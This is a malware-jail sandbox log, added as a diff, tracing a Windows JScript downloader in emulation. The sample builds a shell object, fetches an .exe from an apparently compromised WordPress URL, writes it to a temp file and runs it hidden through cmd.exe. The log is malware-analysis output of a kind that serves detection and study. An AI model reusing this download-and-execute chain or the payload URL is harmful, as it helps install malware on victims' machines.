@@ -1,0 +1,75 @@
+9 Aug 12:20:15 - mailware-jail, a malware sandbox ver. 0.20
+9 Aug 12:20:15 - ------------------------
+9 Aug 12:20:15 - Arguments: /home/edelweiss/Overseer/malware-jail/malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js -s /home/edelweiss/Overseer/test/
+9 Aug 12:20:15 - Sandbox environment sequence: env/utils.js,env/eval.js,env/function.js,env/wscript.js,env/browser.js,env/agents.js,env/other.js,env/console.js
+9 Aug 12:20:15 - Malware files: /home/edelweiss/Overseer/malware-jail/malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js
+9 Aug 12:20:15 - Execution timeout set to: 60 seconds
+9 Aug 12:20:15 - Output file for sandbox dump: sandbox_dump_after.json
+9 Aug 12:20:15 - Output directory for generated files: /home/edelweiss/Overseer/test/
+9 Aug 12:20:15 - Download from remote server: No
+9 Aug 12:20:15 - ==> Preparing Sandbox environment.
+9 Aug 12:20:15 -  => Executing: env/utils.js quitely
+9 Aug 12:20:15 -  => Executing: env/eval.js quitely
+9 Aug 12:20:15 -  => Executing: env/function.js quitely
+9 Aug 12:20:15 -  => Executing: env/wscript.js quitely
+9 Aug 12:20:15 -  => Executing: env/browser.js quitely
+9 Aug 12:20:15 -  => Executing: env/agents.js quitely
+9 Aug 12:20:15 -  => Executing: env/other.js quitely
+9 Aug 12:20:15 -  => Executing: env/console.js quitely
+9 Aug 12:20:15 - ==> Executing malware file(s). =========================================
+9 Aug 12:20:15 -  => Executing: /home/edelweiss/Overseer/malware-jail/malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js verbosely, reporting silent catches
+9 Aug 12:20:15 - Saving: /home/edelweiss/Overseer/test/_home_edelweiss_Overseer_malware-jail_malware_20161007_3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js
+9 Aug 12:20:15 - Saving: /home/edelweiss/Overseer/test/tr__home_edelweiss_Overseer_malware-jail_malware_20161007_3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js
+9 Aug 12:20:15 - WScript.scriptfullname = (string) '/home/edelweiss/Overseer/malware-jail/malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js'
+9 Aug 12:20:15 - WScript.arguments = (object) '/home/edelweiss/Overseer/malware-jail/malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js,xyz'
+9 Aug 12:20:15 - new Function(var orqasnakri = WScript.CreateObject('WScript.Shell'); var fcoppohwura9 = orqasnakri.CreateShortcut('\qvertyd.lnk'); return fcoppohwura9.TargetPath;) => Function[14]
+9 Aug 12:20:15 - Calling Function[14]() on sandbox
+9 Aug 12:20:15 - WScript.CreateObject(WScript.Shell)
+9 Aug 12:20:15 - new WScript.Shell[15]
+9 Aug 12:20:15 - WScript.CreateShortcut(qvertyd.lnk)
+9 Aug 12:20:15 - new WshShortcut[16](qvertyd.lnk)
+9 Aug 12:20:15 - WshShortcut[16](qvertyd.lnk).targetpath.get() => (string) ''
+9 Aug 12:20:15 - Returning: ''
+9 Aug 12:20:15 - WScript.CreateObject(Scripting.FileSystemObject)
+9 Aug 12:20:15 - new Scripting.FileSystemObject[17]
+9 Aug 12:20:15 - new DriveObject[18](C:)
+9 Aug 12:20:15 - DriveObject[18](C:).name = (string) 'C:'
+9 Aug 12:20:15 - new Collection[19]([?  DriveObject {?    id: 18,?    _name: 'DriveObject[18](C:)',?    _availablespace: '',?    _driveletter: '',?    _drivetype: '',?    _filesystem: '',?    _freespace: '',?    _isready: '',?    _path: '',?    _rootfolder: '',?    _serialnumber: '',?  ... (truncated))
+9 Aug 12:20:15 - Collection[19].count = (number) '1'
+9 Aug 12:20:15 - WScript.CreateObject(WScript.Shell)
+9 Aug 12:20:15 - new WScript.Shell[20]
+9 Aug 12:20:15 - WScript.CreateObject(MSXML2.XMLHTTP)
+9 Aug 12:20:15 - new MSXML2.XMLHTTP[21]
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21].onreadystatechange = (undefined) 'undefined'
+9 Aug 12:20:15 - WScript.CreateObject(ADODB.Stream)
+9 Aug 12:20:15 - new ADODB_Stream[22]
+9 Aug 12:20:15 - Scripting.FileSystemObject[17].GetSpecialFolder(2) => C:\Users\User\AppData\Local\Temp\
+9 Aug 12:20:15 - Scripting.FileSystemObject[17].GetTempName() => TempFile_23.tmp
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21].open(GET,http://kutchvalley.com/creative/wp-admin/css/colors/midnight/gNcCTV.exe,0)
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21].method = (string) 'GET'
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21].url = (string) 'http://kutchvalley.com/creative/wp-admin/css/colors/midnight/gNcCTV.exe'
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21].async = (boolean) 'false'
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21].send(undefined)
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21] Not sending data, if you want to interact with remote server, set --down
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21].status = (number) '200'
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21].readystate = (number) '4'
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21].onreadystatechange.get() => (undefined) 'undefined'
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21].send(undefined) finished
+9 Aug 12:20:15 - ADODB_Stream[22].type = (string) '1'
+9 Aug 12:20:15 - MSXML2.XMLHTTP[21].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+9 Aug 12:20:15 - WScript.scriptfullname.get() => (string) '/home/edelweiss/Overseer/malware-jail/malware/20161007/3c1ab04d15fdc84afbf819df546359c8df9a8c303c67c90ce28a4417d9039393.js'
+9 Aug 12:20:15 - ADODB_Stream[22].Open()
+9 Aug 12:20:15 - ADODB_Stream[22].content = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+9 Aug 12:20:15 - ADODB_Stream[22].Write(str) - 11202 bytes
+9 Aug 12:20:15 - ADODB_Stream[22].size = (number) '11202'
+9 Aug 12:20:15 - ADODB_Stream[22].SaveToFile(C:\Users\User\AppData\Local\Temp\TempFile_23.tmp, undefined)
+9 Aug 12:20:15 - ADODB_Stream[22].content.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
+9 Aug 12:20:15 - ADODB_Stream[22].Close()
+9 Aug 12:20:15 - WScript.Shell[20].Run(cmd.exe /c C:\Users\User\AppData\Local\Temp\TempFile_23.tmp, 0, undefined)
+9 Aug 12:20:15 - ==> Cleaning up sandbox.
+9 Aug 12:20:15 - ==> Script execution finished, dumping sandbox environment to a file.
+9 Aug 12:20:15 - The sandbox context has been  saved to: sandbox_dump_after.json
+9 Aug 12:20:15 - Saving: /home/edelweiss/Overseer/test/Function[14].js
+9 Aug 12:20:15 - Saving: /home/edelweiss/Overseer/test/C__Users_User_AppData_Local_Temp_TempFile_23.tmp
+9 Aug 12:20:15 - Saving: /home/edelweiss/Overseer/test/urls.json
